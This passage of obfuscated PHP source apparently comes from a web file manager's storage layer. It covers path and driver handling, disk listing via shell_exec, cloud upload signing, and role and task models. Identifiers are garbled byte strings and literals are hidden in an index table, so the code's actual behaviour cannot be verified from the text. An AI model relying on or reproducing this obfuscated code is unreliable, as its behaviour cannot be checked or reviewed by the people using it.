$åì¦¯ë„ = $Çû¾ÚË¹ . $¶ÀÍÓà´[1409]; $‚˜ÇÜ¾ = $‚˜ÇÜ¾ ? $‚˜ÇÜ¾ : Cache::get($åì¦¯ë„); if (!$‚˜ÇÜ¾ && $š¢úçÏÀ) { $‚˜ÇÜ¾ = IO::hashSimple($²§—ªƒ[$¶ÀÍÓà´[87]]); Cache::set($åì¦¯ë„, $‚˜ÇÜ¾ ? $‚˜ÇÜ¾ : $Çû¾ÚË¹, 3600 * 24 * 30); } return $‚˜ÇÜ¾ ? $‚˜ÇÜ¾ : $Çû¾ÚË¹; } public static function hashPathSafe($ú¹àİÚ, $ºøŒõ…¸ = false) { $®½á«œ¨ =& $_SERVER[åÄ¼Ùßš]; $‡ú‡óõ = self::hashPath($ú¹àİÚ, $ºøŒõ…¸); return md5($‡ú‡óõ . $®½á«œ¨[1410] . Model($®½á«œ¨[866])->get($®½á«œ¨[867])); } public static function initSystemPath() { $ş°«„İ· =& $_SERVER[åÄ¼Ùßš]; if (defined($ş°«„İ·[1411])) { return; } define($ş°«„İ·[1411], self::systemPath($ş°«„İ·[192])); define($ş°«„İ·[1412], self::systemPath($ş°«„İ·[1413])); define($ş°«„İ·[1414], self::systemPath($ş°«„İ·[1415])); define($ş°«„İ·[1416], self::systemPath($ş°«„İ·[1417])); IOHistory::bindEvent(); } public static function systemPath($ÍÌ¦ˆ) { $Ë‡±ÀÑÜ =& $_SERVER[åÄ¼Ùßš]; $±ğœ¨Çµ = $Ë‡±ÀÑÜ[1418] . ucfirst($ÍÌ¦ˆ); $ÂÑÛÓ˜ = Model($Ë‡±ÀÑÜ[866])->get($±ğœ¨Çµ); if ($ÂÑÛÓ˜) { return $ÂÑÛÓ˜; } if ($ÍÌ¦ˆ == $Ë‡±ÀÑÜ[192]) { $ÂÑÛÓ˜ = self::make(Model($Ë‡±ÀÑÜ[926])->systemRootPathAdd($Ë‡±ÀÑÜ[621])); } else { $ÂÑÛÓ˜ = self::systemPath($Ë‡±ÀÑÜ[192]); $·ëñäĞŒ = self::sourceID($ÂÑÛÓ˜); $ÂÑÛÓ˜ = self::make(Model($Ë‡±ÀÑÜ[926])->mkdir($·ëñäĞŒ, $ÍÌ¦ˆ)); } Model($Ë‡±ÀÑÜ[866])->set($±ğœ¨Çµ, $ÂÑÛÓ˜); return $ÂÑÛÓ˜; } public static function systemFolder($¡Çûöµ) { $ñŒú”ÓÖ = IO_PATH_SYSTEM_SOURCE . $¡Çûöµ; $ù‹À€¶” = Cache::get($ñŒú”ÓÖ); if (!$ù‹À€¶”) { $æ¦ø©¤ê = IO::infoFullSimple($ñŒú”ÓÖ); if (!$æ¦ø©¤ê) { $ù‹À€¶” = IO::mkdir($ñŒú”ÓÖ, REPEAT_SKIP); } else { $ù‹À€¶” = $æ¦ø©¤ê[$_SERVER[åÄ¼Ùßš][87]]; } Cache::set($ñŒú”ÓÖ, $ù‹À€¶”, 3600 * 10); } return $ù‹À€¶”; } public static function defaultDriver() { return Model($_SERVER[åÄ¼Ùßš][861])->defaultDriver(); } public static function defaultDriverInit() { $ìêÍ˜“è =& $_SERVER[åÄ¼Ùßš]; static $œÒƒƒñÛ = false; if ($œÒƒƒñÛ) { return $œÒƒƒñÛ; } $Ñ´ÂæÙ‚ = self::defaultDriver(); $œÒƒƒñÛ = IO::init($ìêÍ˜“è[1419] . $Ñ´ÂæÙ‚[$ìêÍ˜“è[484]] . $ìêÍ˜“è[1407]); return $œÒƒƒñÛ; } public static function fileTypeList() { $ãõŞåÌĞ =& $_SERVER[åÄ¼Ùßš]; $İâí§Ãœ = $GLOBALS[$ãõŞåÌĞ[6]][$ãõŞåÌĞ[1420]]; foreach ($İâí§Ãœ as $¤¾¼—Ì‹ => $Ÿ¹®ºñ‹) { $Ğºá¢á¿ = $ãõŞåÌĞ[1421] . $¤¾¼—Ì‹; $¸–²çÂŞ = LNG($Ğºá¢á¿); if ($Ğºá¢á¿ != $¸–²çÂŞ) { $İâí§Ãœ[$¤¾¼—Ì‹][$ãõŞåÌĞ[32]] = $¸–²çÂŞ; } } return $İâí§Ãœ; } public static function ioFileDriverGet($Â±‡¦‹ = '') { $ÙˆÃøÓÈ =& $_SERVER[åÄ¼Ùßš]; static $°õäíö = array(); static $Û«¸¶© = array(); static $³©Ì×±¢ = array(); static $”À“şå¯ = false; if ($”À“şå¯ === !1) { $”À“şå¯ = array($ÙˆÃøÓÈ[591] => array(), $ÙˆÃøÓÈ[678] => array()); $Ü»õ¬áï = Model($ÙˆÃøÓÈ[1422])->get(!1, $ÙˆÃøÓÈ[1423]); foreach ($Ü»õ¬áï as $à¸£âß‚ => $£íƒ›€®) { if (!$£íƒ›€® || $£íƒ›€® == $ÙˆÃøÓÈ[12]) { continue; } if (strstr($à¸£âß‚, $ÙˆÃøÓÈ[1424])) { $É·®‰¼ = str_replace($ÙˆÃøÓÈ[1424], $ÙˆÃøÓÈ[12], $à¸£âß‚); $”À“şå¯[$ÙˆÃøÓÈ[591]][$É·®‰¼] = $£íƒ›€®; } else { if (strstr($à¸£âß‚, $ÙˆÃøÓÈ[1425])) { $É·®‰¼ = str_replace($ÙˆÃøÓÈ[1425], $ÙˆÃøÓÈ[12], $à¸£âß‚); $”À“şå¯[$ÙˆÃøÓÈ[678]][$É·®‰¼] = $£íƒ›€®; } } } } $±ˆ°¢âë = self::defaultDriver(); if (!$Â±‡¦‹ || !$”À“şå¯[$ÙˆÃøÓÈ[591]] && !$”À“şå¯[$ÙˆÃøÓÈ[678]]) { return $±ˆ°¢âë; } $Ìµ¥ÛÈš = self::getPathSourceID($Â±‡¦‹); if (!$Ìµ¥ÛÈš) { return $±ˆ°¢âë; } if (isset($°õäíö[$Ìµ¥ÛÈš])) { return $°õäíö[$Ìµ¥ÛÈš]; } $Éµ……öş = Model($ÙˆÃøÓÈ[926])->sourceInfo($Ìµ¥ÛÈš); $§û¼šíš = $Éµ……öş[$ÙˆÃøÓÈ[582]]; $¬’ûÛÌú = array(); if (!$Éµ……öş) { return $±ˆ°¢âë; } if ($Éµ……öş[$ÙˆÃøÓÈ[191]] == $ÙˆÃøÓÈ[91]) { if (isset($³©Ì×±¢[$§û¼šíš])) { return $³©Ì×±¢[$§û¼šíš]; } if (isset($”À“şå¯[$ÙˆÃøÓÈ[678]][$§û¼šíš])) { $¿Ú³Å” = Model($ÙˆÃøÓÈ[861])->driverInfo($”À“şå¯[$ÙˆÃøÓÈ[678]][$§û¼šíš]); $±ˆ°¢âë = $¿Ú³Å” ? $¿Ú³Å” : $±ˆ°¢âë; $³©Ì×±¢[$§û¼šíš] = $±ˆ°¢âë; $°õäíö[$Ìµ¥ÛÈš] = $±ˆ°¢âë; return $±ˆ°¢âë; } $¬’ûÛÌú = self::groupParentUser($§û¼šíš); } else { if ($Éµ……öş[$ÙˆÃøÓÈ[191]] == $ÙˆÃøÓÈ[521]) { $µÜÈú˜ = Model($ÙˆÃøÓÈ[1426])->getInfo($§û¼šíš); if ($µÜÈú˜) { $¬’ûÛÌú = explode($ÙˆÃøÓÈ[50], trim($µÜÈú˜[$ÙˆÃøÓÈ[597]], $ÙˆÃøÓÈ[50])); $¬’ûÛÌú = array_remove_value($¬’ûÛÌú, $ÙˆÃøÓÈ[231]); $¬’ûÛÌú[] = $§û¼šíš; $¬’ûÛÌú = array_reverse($¬’ûÛÌú); } } } foreach ($¬’ûÛÌú as $¦êëêäÜ) { if (!isset($”À“şå¯[$ÙˆÃøÓÈ[591]][$¦êëêäÜ])) { continue; } if (isset($Û«¸¶©[$¦êëêäÜ])) { return $Û«¸¶©[$¦êëêäÜ]; } $¿Ú³Å” = Model($ÙˆÃøÓÈ[861])->driverInfo($”À“şå¯[$ÙˆÃøÓÈ[591]][$¦êëêäÜ]); $±ˆ°¢âë = $¿Ú³Å” ? $¿Ú³Å” : $±ˆ°¢âë; $Û«¸¶©[$¦êëêäÜ] = $±ˆ°¢âë; break; } if ($Éµ……öş[$ÙˆÃøÓÈ[191]] == $ÙˆÃøÓÈ[91]) { $³©Ì×±¢[$§û¼šíš] = $±ˆ°¢âë; } $°õäíö[$Ìµ¥ÛÈš] = $±ˆ°¢âë; return $±ˆ°¢âë; } private static function getPathSourceID($ûƒŸºœ) { $Ç€û‘ˆ =& $_SERVER[åÄ¼Ùßš]; static $ÌÆŒÖ­¹ = array(); if (!$ûƒŸºœ) { return $Ç€û‘ˆ[12]; } $ˆëş¦Ş = substr($ûƒŸºœ, 0, strlen($Ç€û‘ˆ[495])) == $Ç€û‘ˆ[495]; $¨¶¥Ø‚ü = substr($ûƒŸºœ, 0, strlen($Ç€û‘ˆ[1394])) == $Ç€û‘ˆ[1394]; $ø—¦Úá = substr($ûƒŸºœ, 0, strlen($Ç€û‘ˆ[1395])) == $Ç€û‘ˆ[1395]; if (!$ˆëş¦Ş && !$¨¶¥Ø‚ü && !$ø—¦Úá) { return $Ç€û‘ˆ[12]; } $…ğŞĞÆ = self::parse($ûƒŸºœ); $äö×¨•Ó = $…ğŞĞÆ[$Ç€û‘ˆ[1288]]; if ($ˆëş¦Ş) { return $…ğŞĞÆ[$Ç€û‘ˆ[484]]; } if (isset($ÌÆŒÖ­¹[$äö×¨•Ó])) { $×‚¬Ï› = $ÌÆŒÖ­¹[$äö×¨•Ó]; } else { $×‚¬Ï› = IO::init($äö×¨•Ó); $ÌÆŒÖ­¹[$äö×¨•Ó] = $×‚¬Ï›; } if (isset($×‚¬Ï›->pathParse[$Ç€û‘ˆ[1291]])) { return $×‚¬Ï›->pathParse[$Ç€û‘ˆ[1291]]; } return $Ç€û‘ˆ[12]; } private static function groupParentUser($·ÄÌ“î·) { $œ„òÂùÏ =& $_SERVER[åÄ¼Ùßš]; $Ó¬´×ªÜ = Model($œ„òÂùÏ[610])->getInfo($·ÄÌ“î·); if (!$Ó¬´×ªÜ) { return array(); } $ÖÓˆÉŸ§ = array_to_keyvalue($Ó¬´×ªÜ[$œ„òÂùÏ[1427]], $œ„òÂùÏ[12], $œ„òÂùÏ[1428]); $»¿«Óûå = array(); foreach ($Ó¬´×ªÜ[$œ„òÂùÏ[1427]] as $¹‰ª¹®) { $»¿«Óûå[] = $¹‰ª¹®[$œ„òÂùÏ[1428]]; $±Ï³Ë‰î = explode($œ„òÂùÏ[50], trim($¹‰ª¹®[$œ„òÂùÏ[597]], $œ„òÂùÏ[50])); $±Ï³Ë‰î = array_remove_value($±Ï³Ë‰î, $œ„òÂùÏ[231]); $±Ï³Ë‰î = array_reverse($±Ï³Ë‰î); $»¿«Óûå = array_merge($»¿«Óûå, $±Ï³Ë‰î); } return array_unique($»¿«Óûå); } public static function diskList($›¼ÁïŸ• = true) { $ê¯›¬áÙ = $_SERVER[åÄ¼Ùßš][1429]; if ($›¼ÁïŸ•) { $­Ê İ«å = Cache::get($ê¯›¬áÙ); if (is_array($­Ê İ«å)) { return $­Ê İ«å; } } $­Ê İ«å = self::diskListGet(); Cache::set($ê¯›¬áÙ, $­Ê İ«å, 60); return $­Ê İ«å; } public static function diskListGet() { $Ü¢Íáß³ =& $_SERVER[åÄ¼Ùßš]; $÷Ë„ ¢ˆ = array(); if ($GLOBALS[$Ü¢Íáß³[6]][$Ü¢Íáß³[1430]] == $Ü¢Íáß³[1431]) { $ç„ÉéÍ = $Ü¢Íáß³[1432]; for ($Æ÷Ê¨¨ = 0; $Æ÷Ê¨¨ < strlen($ç„ÉéÍ); $Æ÷Ê¨¨++) { $óº¢ÌŠ = $ç„ÉéÍ[$Æ÷Ê¨¨] . $Ü¢Íáß³[1433]; if (file_exists($óº¢ÌŠ)) { $÷Ë„ ¢ˆ[] = $óº¢ÌŠ; } } return $÷Ë„ ¢ˆ; } if (!function_exists($Ü¢Íáß³[101])) { $÷Ë„ ¢ˆ[] = $Ü¢Íáß³[940]; return $÷Ë„ ¢ˆ; } $ÈüÇÎßğ = explode($Ü¢Íáß³[288], shell_exec($Ü¢Íáß³[1434])); array_shift($ÈüÇÎßğ); array_pop($ÈüÇÎßğ); $ğ¡‡œÏ¼ = array($Ü¢Íáß³[1435], $Ü¢Íáß³[1436], $Ü¢Íáß³[1437], $Ü¢Íáß³[1438], $Ü¢Íáß³[1439], $Ü¢Íáß³[1440], $Ü¢Íáß³[1441], $Ü¢Íáß³[1442]); foreach ($ÈüÇÎßğ as $÷€Ó«ÑÈ) { $»óí¸ËÜ = preg_split($Ü¢Íáß³[1443], $÷€Ó«ÑÈ); $óº¢ÌŠ = $»óí¸ËÜ[count($»óí¸ËÜ) - 1]; if (!strstr($»óí¸ËÜ[0], $Ü¢Íáß³[1444]) || !$óº¢ÌŠ) { continue; } $ÍªÉìÛö = rtrim($óº¢ÌŠ, $Ü¢Íáß³[8]) . $Ü¢Íáß³[8]; if (in_array($ÍªÉìÛö, $ğ¡‡œÏ¼)) { continue; } $÷Ë„ ¢ˆ[] = $ÍªÉìÛö; } return $÷Ë„ ¢ˆ; } public static function isSameDisk($éê ñ†ä, $øÄÒÎÅ¿) { $æ§Çª¦ô =& $_SERVER[åÄ¼Ùßš]; if ($GLOBALS[$æ§Çª¦ô[6]][$æ§Çª¦ô[1430]] == $æ§Çª¦ô[1431]) { return strtolower(substr($éê ñ†ä, 0, 1)) == strtolower(substr($øÄÒÎÅ¿, 0, 1)); } $·¡©ÖŞ„ = stat($éê ñ†ä); $‹Û¼êè = stat($øÄÒÎÅ¿); if ($·¡©ÖŞ„ === !1 || $‹Û¼êè === !1) { return !1; } return $·¡©ÖŞ„[$æ§Çª¦ô[1445]] === $‹Û¼êè[$æ§Çª¦ô[1445]]; $¨¶¿’Ş = self::diskList(); $ª¶üŸ§ô = !1; $ĞûıÈÀê = !1; sort($¨¶¿’Ş); $¨¶¿’Ş = array_reverse($¨¶¿’Ş); $éê ñ†ä = rtrim($éê ñ†ä, $æ§Çª¦ô[8]) . $æ§Çª¦ô[8]; $øÄÒÎÅ¿ = rtrim($øÄÒÎÅ¿, $æ§Çª¦ô[8]) . $æ§Çª¦ô[8]; foreach ($¨¶¿’Ş as $´ÁûÕ÷ˆ) { $”Òğ… = strlen($´ÁûÕ÷ˆ); if (!$ª¶üŸ§ô && substr($éê ñ†ä, 0, $”Òğ…) == $´ÁûÕ÷ˆ) { $ª¶üŸ§ô = $´ÁûÕ÷ˆ; } if (!$ĞûıÈÀê && substr($øÄÒÎÅ¿, 0, $”Òğ…) == $´ÁûÕ÷ˆ) { $ĞûıÈÀê = $´ÁûÕ÷ˆ; } if ($ª¶üŸ§ô && $ĞûıÈÀê) { break; } } return $ª¶üŸ§ô === $ĞûıÈÀê; } public static function transferType($†Ï×íò, $ñûí  ø) { $‘ü•Ã«¡ =& $_SERVER[åÄ¼Ùßš]; $¹÷ì‡—ë = self::driverType($†Ï×íò); $ÇÉŠã = self::driverType($ñûí  ø); if ($¹÷ì‡—ë[$‘ü•Ã«¡[33]] == $ÇÉŠã[$‘ü•Ã«¡[33]] && $¹÷ì‡—ë[$‘ü•Ã«¡[1446]] == $ÇÉŠã[$‘ü•Ã«¡[1446]]) { return $‘ü•Ã«¡[1447]; } if ($¹÷ì‡—ë[$‘ü•Ã«¡[33]] == $‘ü•Ã«¡[975] && $ÇÉŠã[$‘ü•Ã«¡[33]] == $‘ü•Ã«¡[109]) { return $‘ü•Ã«¡[1317]; } if ($¹÷ì‡—ë[$‘ü•Ã«¡[33]] == $‘ü•Ã«¡[109] && $ÇÉŠã[$‘ü•Ã«¡[33]] == $‘ü•Ã«¡[975]) { return $‘ü•Ã«¡[110]; } return $‘ü•Ã«¡[1448]; } public static function driverType($÷ÇòÛª©) { $’±—şÄ =& $_SERVER[åÄ¼Ùßš]; $Â¥†øš = str_replace($’±—şÄ[1449], $’±—şÄ[12], strtolower($÷ÇòÛª©->getType())); if ($Â¥†øš == $’±—şÄ[851] || $Â¥†øš == $’±—şÄ[1450] || $Â¥†øš == $’±—şÄ[1451]) { $ı¡ºå‚ò = self::ioFileDriverGet($’±—şÄ[495] . $÷ÇòÛª©->pathParse[$’±—şÄ[1291]] . $’±—şÄ[404]); $÷ÇòÛª© = IO::init($’±—şÄ[1419] . $ı¡ºå‚ò[$’±—şÄ[484]] . $’±—şÄ[1407]); } else { if ($Â¥†øš == $’±—şÄ[1327] || $Â¥†øš == $’±—şÄ[1452]) { $÷ÇòÛª© = IO::init($÷ÇòÛª©->pathParse[$’±—şÄ[1268]]); } } $ĞÌüë±ò = $÷ÇòÛª©->path; $Â¥†øš = str_replace($’±—şÄ[1449], $’±—şÄ[12], strtolower($÷ÇòÛª©->getType())); if ($Â¥†øš == $’±—şÄ[109]) { return array($’±—şÄ[33] => $’±—şÄ[109], $’±—şÄ[1446] => $’±—şÄ[12], $’±—şÄ[87] => $ĞÌüë±ò, $’±—şÄ[98] => $÷ÇòÛª©); } return array($’±—şÄ[33] => $’±—şÄ[975], $’±—şÄ[1446] => $÷ÇòÛª©->pathDriver, $’±—şÄ[87] => $ĞÌüë±ò, $’±—şÄ[98] => $÷ÇòÛª©); } public static function pathDriverType($»ÁÚ®£) { return $»ÁÚ®£ ? self::driverType(IO::init($»ÁÚ®£)) : !1; } public static function pathDriverLocal($²•‚èÉ) { $¾¿îòÌ =& $_SERVER[åÄ¼Ùßš]; $£ìÁä‡º = $²•‚èÉ ? self::driverType(IO::init($²•‚èÉ)) : !1; return strtolower($£ìÁä‡º[$¾¿îòÌ[33]]) == $¾¿îòÌ[109] ? !0 : !1; } public static function allowCover($Î€æÖŸÛ, $›õâµ—á = true) { $ğä÷Ü =& $_SERVER[åÄ¼Ùßš]; if (is_string($Î€æÖŸÛ)) { $Î€æÖŸÛ = IO::info($Î€æÖŸÛ); } if (!$Î€æÖŸÛ || $Î€æÖŸÛ[$ğä÷Ü[33]] == $ğä÷Ü[78] || $Î€æÖŸÛ[$ğä÷Ü[79]] <= 100) { return !1; } if (isset($Î€æÖŸÛ[$ğä÷Ü[1453]]) || !$Î€æÖŸÛ[$ğä÷Ü[87]]) { return !1; } if (isset($Î€æÖŸÛ[$ğä÷Ü[235]]) && !$Î€æÖŸÛ[$ğä÷Ü[235]]) { return !1; } static $©Ò÷°Îº = false; if (!$©Ò÷°Îº || !$›õâµ—á) { $½ºŒÎ® = self::driverType(IO::init($Î€æÖŸÛ[$ğä÷Ü[87]])); $Å­…ïÔ = $½ºŒÎ®[$ğä÷Ü[98]]; $©Ò÷°Îº = $ğä÷Ü[197]; if ($½ºŒÎ®[$ğä÷Ü[33]] == $ğä÷Ü[109]) { $©Ò÷°Îº = $ğä÷Ü[1454]; } if ($½ºŒÎ®[$ğä÷Ü[98]] && is_array($½ºŒÎ®[$ğä÷Ü[98]]->config)) { $—ÖãØ¨º = $½ºŒÎ®[$ğä÷Ü[98]]->config; if (isset($—ÖãØ¨º[$ğä÷Ü[1455]]) && $—ÖãØ¨º[$ğä÷Ü[1455]]) { $©Ò÷°Îº = $ğä÷Ü[1454]; } } $‰Ş§…À = KodIO::defaultDriver(); if (strtolower($‰Ş§…À[$ğä÷Ü[98]]) == $ğä÷Ü[109] && is_array($‰Ş§…À[$ğä÷Ü[6]])) { $œºøÙ‡¡ = $‰Ş§…À[$ğä÷Ü[6]][$ğä÷Ü[1300]]; if (substr($œºøÙ‡¡, 0, 2) == $ğä÷Ü[1456]) { $œºøÙ‡¡ = str_replace($ğä÷Ü[1456], BASIC_PATH, $œºøÙ‡¡); } $œºøÙ‡¡ = str_replace($ğä÷Ü[257], $ğä÷Ü[8], $œºøÙ‡¡); if (substr($Î€æÖŸÛ[$ğä÷Ü[87]], 0, strlen($œºøÙ‡¡)) == $œºøÙ‡¡) { $©Ò÷°Îº = $ğä÷Ü[197]; } } } return $©Ò÷°Îº == $ğä÷Ü[1454] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($‡ÍÀ‰©Í) { parent::__construct($‡ÍÀ‰©Í); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÃÀµñ¹€) { parent::__construct($ÃÀµñ¹€); $this->setSignVersion($_SERVER[åÄ¼Ùßš][250]); } public function uploadFormData($É‚êèî, $Âˆì“ïª = 3600) { $ƒ­‰êÈÙ =& $_SERVER[åÄ¼Ùßš]; $”ÕÖçá = $ƒ­‰êÈÙ[232]; $é£º¶»³ = $ƒ­‰êÈÙ[1457]; $œÑ—üöÇ = $ƒ­‰êÈÙ[264]; $•ÁÔ‰ø™ = gmdate($ƒ­‰êÈÙ[1458], time() + $Âˆì“ïª); $‡ıÄÄ¬ê = (string) time() . $ƒ­‰êÈÙ[74] . (string) (time() + $Âˆì“ïª); $ªŒŠŠØ÷ = array($ƒ­‰êÈÙ[265] => $•ÁÔ‰ø™, $ƒ­‰êÈÙ[268] => array(array($ƒ­‰êÈÙ[309] => $”ÕÖçá), array($ƒ­‰êÈÙ[269] => $this->bucket), array($ƒ­‰êÈÙ[270], $ƒ­‰êÈÙ[271], $ƒ­‰êÈÙ[12]), array($ƒ­‰êÈÙ[273] => $œÑ—üöÇ), array($ƒ­‰êÈÙ[1459] => $é£º¶»³), array($ƒ­‰êÈÙ[1460] => $this->accessKey), array($ƒ­‰êÈÙ[1461] => $‡ıÄÄ¬ê))); $ªŒŠŠØ÷ = json_encode($ªŒŠŠØ÷); $ŠÑÙÏ¦ä = hash_hmac($ƒ­‰êÈÙ[1457], $‡ıÄÄ¬ê, $this->secret); $Èª†şâç = sha1($ªŒŠŠØ÷); $ö¤î£Ğ… = hash_hmac($ƒ­‰êÈÙ[1457], $Èª†şâç, $ŠÑÙÏ¦ä); $Í¦Ê´»® = array($ƒ­‰êÈÙ[309] => $”ÕÖçá, $ƒ­‰êÈÙ[273] => $œÑ—üöÇ, $ƒ­‰êÈÙ[280] => base64_encode($ªŒŠŠØ÷), $ƒ­‰êÈÙ[1459] => $é£º¶»³, $ƒ­‰êÈÙ[1460] => $this->accessKey, $ƒ­‰êÈÙ[1462] => $‡ıÄÄ¬ê, $ƒ­‰êÈÙ[1463] => $ö¤î£Ğ…, $ƒ­‰êÈÙ[209] => $this->getHost()); return $Í¦Ê´»®; } public function fileOutImage($€¯ƒ™óí, $Ì£å²»ó = 250) { $³Î¨…Á» =& $_SERVER[åÄ¼Ùßš]; if ($this->size($€¯ƒ™óí) > 1024 * 1024 * 32) { return $this->fileOutImageServer($€¯ƒ™óí, $Ì£å²»ó); } $ş×ç ‡Ë = $this->link($€¯ƒ™óí); $ş×ç ‡Ë .= $³Î¨…Á»[1464] . $Ì£å²»ó . $³Î¨…Á»[1465]; $this->fileOutLink($ş×ç ‡Ë); } } goto F¯ÙšËªÌ…; A»‘ÆŠŞä: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x72\x6f\x6c\x65\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\164\x68", "\x6c\141\x62\x65\x6c", "\x64\151\x73\x70\154\141\171", "\x73\x79\x73\x74\145\x6d", "\144\x65\x73\143", "\151\x67\x6e\x6f\162\x65\x45\170\x74", "\151\147\x6e\x6f\162\x65\x46\x69\x6c\145\x53\151\x7a\145", "\141\144\x6d\x69\x6e\151\163\x74\162\141\x74\x6f\162", "\x73\157\x72\x74"); public function listData($İë©ÏØ = false, $Ï¼˜ôËÆ = "\163\157\x72\164", $”ÜûëÃÎ = false) { $—¼Üëèé =& $_SERVER[åÄ¼Ùßš]; $çÊ¦šµ÷ = parent::listData($İë©ÏØ, $Ï¼˜ôËÆ, $”ÜûëÃÎ); if (!$İë©ÏØ) { foreach ($çÊ¦šµ÷ as $şÛÛí”Ã => $¦­êììŸ) { if ($¦­êììŸ[$—¼Üëèé[2218]] == 1) { $çÊ¦šµ÷[$şÛÛí”Ã][$—¼Üëèé[537]] = LNG($—¼Üëèé[2513]); } } } return $çÊ¦šµ÷; } public function update($¥Æë…¨±, $ø‰ƒÓ¹) { $¦©ñø­ =& $_SERVER[åÄ¼Ùßš]; $çâ×Êà = parent::listData($¥Æë…¨±); $òş×¹‰‘ = $this->findByName($ø‰ƒÓ¹[$¦©ñø­[32]]); if (!$çâ×Êà || $òş×¹‰‘ && $òş×¹‰‘[$¦©ñø­[484]] != $çâ×Êà[$¦©ñø­[484]]) { return !1; } if ($òş×¹‰‘[$¦©ñø­[2218]] == 1) { $ø‰ƒÓ¹ = array($¦©ñø­[32] => $ø‰ƒÓ¹[$¦©ñø­[32]], $¦©ñø­[2040] => $ø‰ƒÓ¹[$¦©ñø­[2040]]); } $this->filterAuth($ø‰ƒÓ¹[$¦©ñø­[499]]); return parent::update($¥Æë…¨±, $ø‰ƒÓ¹); } public function remove($òãš¬Ç®) { $û½£‡ıÖ = parent::listData($òãš¬Ç®); if (!$û½£‡ıÖ || $û½£‡ıÖ[$_SERVER[åÄ¼Ùßš][192]]) { return !1; } return parent::remove($òãš¬Ç®); } public function add($ŠÍÑ˜„) { $í½ïìÓğ =& $_SERVER[åÄ¼Ùßš]; $‡µßèÇÒ = $ŠÍÑ˜„[$í½ïìÓğ[32]]; if ($this->findByName($‡µßèÇÒ)) { return !1; } $¥Ş¥ñ¡Á = array($í½ïìÓğ[506] => $‡µßèÇÒ, $í½ïìÓğ[2023] => $í½ïìÓğ[12], $í½ïìÓğ[2019] => $í½ïìÓğ[2027], $í½ïìÓğ[2514] => 1, $í½ïìÓğ[2022] => 0, $í½ïìÓğ[2515] => 0, $í½ïìÓğ[2021] => $this->getSort()); $ŠÍÑ˜„ = array_merge($¥Ş¥ñ¡Á, $ŠÍÑ˜„); $this->filterAuth($ŠÍÑ˜„[$í½ïìÓğ[499]]); return parent::insert($ŠÍÑ˜„); } private function getSort() { $õ§Ä¨® =& $_SERVER[åÄ¼Ùßš]; $˜Æèâö = parent::listData(); $ÕÑÜ°Œ© = array_to_keyvalue($˜Æèâö, $õ§Ä¨®[12], $õ§Ä¨®[2041]); return empty($ÕÑÜ°Œ©) ? 0 : max($ÕÑÜ°Œ©) + 1; } private function filterAuth(&$µÃÊß) { $’ÏŞÃ×ù =& $_SERVER[åÄ¼Ùßš]; $‡€µŞâµ = array(); $ÓÈÍª¾ = array_filter(explode($’ÏŞÃ×ù[50], $µÃÊß)); foreach ($ÓÈÍª¾ as $µÃÊß) { $î—¡Ñóì = explode($’ÏŞÃ×ù[10], $µÃÊß); if ($î—¡Ñóì[0] == $’ÏŞÃ×ù[2516] && $î—¡Ñóì[1] != $’ÏŞÃ×ù[1313]) { $Ï”˜å¦° = $î—¡Ñóì[0] . $’ÏŞÃ×ù[10] . $î—¡Ñóì[1] . $’ÏŞÃ×ù[2517]; if (!in_array($Ï”˜å¦°, $ÓÈÍª¾)) { $‡€µŞâµ[] = $Ï”˜å¦°; } } $‡€µŞâµ[] = $µÃÊß; } $µÃÊß = implode($’ÏŞÃ×ù[50], $‡€µŞâµ); } public function findRoleDefault() { $ì—„• =& $_SERVER[åÄ¼Ùßš]; $ÁËÙ µß = parent::listData(); $Çù¼¬Ù‹ = !1; foreach ($ÁËÙ µß as $”›şí¡Ş) { if (!$”›şí¡Ş || $”›şí¡Ş[$ì—„•[2039]] == $ì—„•[231] || $”›şí¡Ş[$ì—„•[2218]] == 1) { continue; } if (strstr($”›şí¡Ş[$ì—„•[499]], $ì—„•[2518])) { continue; } if (!strstr($”›şí¡Ş[$ì—„•[499]], $ì—„•[2519])) { continue; } if (!$Çù¼¬Ù‹) { $Çù¼¬Ù‹ = $”›şí¡Ş; continue; } $È­¢†«© = explode($ì—„•[50], $Çù¼¬Ù‹[$ì—„•[499]]); $û‹çŒò = explode($ì—„•[50], $”›şí¡Ş[$ì—„•[499]]); if (count($È­¢†«©) > count($û‹çŒò)) { $Çù¼¬Ù‹ = $”›şí¡Ş; } } return $Çù¼¬Ù‹ ? $Çù¼¬Ù‹[$ì—„•[484]] : $ì—„•[12]; } public function sort($¦”º¶†, $É§›÷¹) { return parent::update($¦”º¶†, $É§›÷¹); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\164\x61\163\153\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x74\x79\160\x65", "\145\166\145\x6e\164", "\164\151\155\145", "\144\145\x73\143", "\x73\171\163\x74\x65\155", "\x65\156\141\142\154\x65", "\154\141\x73\164\x52\x75\156", "\x73\157\x72\x74"); public function listData($°Í¢¹Ú¯ = false, $íŒ…ú® = "\163\157\x72\164", $ËÇîÂğ„ = false) { return parent::listData($°Í¢¹Ú¯, $íŒ…ú®, $ËÇîÂğ„); } public function add($÷¨úÏÅ†) { $²Œõ¼ú¡ =& $_SERVER[åÄ¼Ùßš]; $¯  “şŒ = $this->findByName($÷¨úÏÅ†[$²Œõ¼ú¡[32]]); if ($¯  “şŒ) { return !1; } $÷¨úÏÅ†[$²Œõ¼ú¡[1767]] = 0; $÷¨úÏÅ†[$²Œõ¼ú¡[2041]] = $this->getSort(); return parent::insert($÷¨úÏÅ†); } private function getSort() { $§È¦àš =& $_SERVER[åÄ¼Ùßš]; $šº»´ê‹ = parent::listData(); $å—·ßÀí = array_to_keyvalue($šº»´ê‹, $§È¦àš[12], $§È¦àš[2041]); return empty($å—·ßÀí) ? 0 : max($å—·ßÀí) + 1; } public function update($°ÍÚÉš•, $¦Äç°•·) { $—ƒ¡«¿¦ =& $_SERVER[åÄ¼Ùßš]; $ëŞµ¨Ì = $this->listData($°ÍÚÉš•); $÷íˆœ«™ = $this->findByName($¦Äç°•·[$—ƒ¡«¿¦[32]]); if (!$ëŞµ¨Ì || $÷íˆœ«™ && $÷íˆœ«™[$—ƒ¡«¿¦[484]] != $ëŞµ¨Ì[$—ƒ¡«¿¦[484]]) { return !1; } return parent::update($°ÍÚÉš•, 